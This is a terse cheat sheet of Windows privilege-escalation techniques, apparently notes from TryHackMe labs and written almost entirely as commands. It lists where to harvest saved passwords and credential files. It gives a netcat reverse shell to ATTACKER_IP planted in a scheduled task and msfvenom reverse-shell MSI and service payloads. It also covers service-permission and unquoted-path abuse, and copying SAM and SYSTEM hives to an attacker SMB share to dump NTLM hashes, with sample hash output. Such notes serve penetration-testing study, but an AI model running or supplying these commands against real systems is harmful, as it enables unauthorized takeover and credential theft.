# Windws priv sec
NOTE: Checkout winpeas
1. Saved passwords (Search for pwoershell history in `ConsoleHost_history.txt` at C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline )
## when mass deployed
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
## powershell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
## saved creds
cmdkey /list
runas /savecred /user:admin cmd.exe

## saved IIS configuration
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

## putty proxy configuration
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

## scheduled tasks
- `schtasks /query /tn vulntask /fo list /v`  this command trims down the output
- just check the `Task To Run` and `Run As`
- `icacls <binary_from_task_to_run>`
- If you can modify binary, then you can run ur own code `echo c:\tools\nc64.exe-e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
	
## AlwaysInstallElevated
- MSI files, if some registry keys have been set, can run with higher priviliges 
- keys to check `C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
- Generate the payload `msfvenom-p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.247.41 LPORT=LOCAL_PORT-f msi-o malicious.msi`
- Run the payload `C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

## Insecure Permissions on Service Executable
- `sc qc <Service_name>`
- `icacls <binary>`
- Can u modify it?
- msfvenom-p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445-f exe-service-o rev-svc.exe
- setup a python http server, in powershell download using wget
- move the original service binary file, since the service binary will be run by another user, change permission  `icacls WService.exe /grant Everyone:F`
- `sc stop <service>` `sc start <service>`
- not any binary can be run as service, so be careful

## Unquoted Service Paths
- If task to run binary path is not properly quoted like `C:\MyPrograms\Disk Sorter Enterprise\bin`
- sc will look for `C:\MyPrograms\Disk.exe` `C:\MyPrograms\Disk Sorter.exe` and `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` respectively
- If u can create such files in the directories, like Disk.exe, u can modify which service is executed.

## Insecure Service Permissions
- not of binary, but of service itself
- can use tool from https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
- accesschk64.exe-qlc <service_name>
- `icacls C:\Users\me\bin.exe /grant Everyone:F`
- `sc config THMService binPath= "C:\Users\me\bin.exe" obj= LocalSystem`
- sc stop and start again

## Windows Privliges
- to check your privilige `whoami /priv`
- use methods from https://github.com/gtworek/Priv2Admin
- tryhackme had `SeBackup / SeRestore` lab
```
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.


user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py-smb2support-username THMBackup-password CopyMaster555 public share
   

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        

And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py-sam sam.hive-system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792- Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```
## Other stuffs
- search for installed programs and exploit any known vulnerabilities `wmic product get name,version,vendor` may also need to check desktop shortcut, services and other indicator of installed apps.
- Additional tools to use `https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS` `https://github.com/itm4n/PrivescCheck` `https://github.com/bitsadmin/wesng` `metasploit multi/recon/local_exploit_suggester`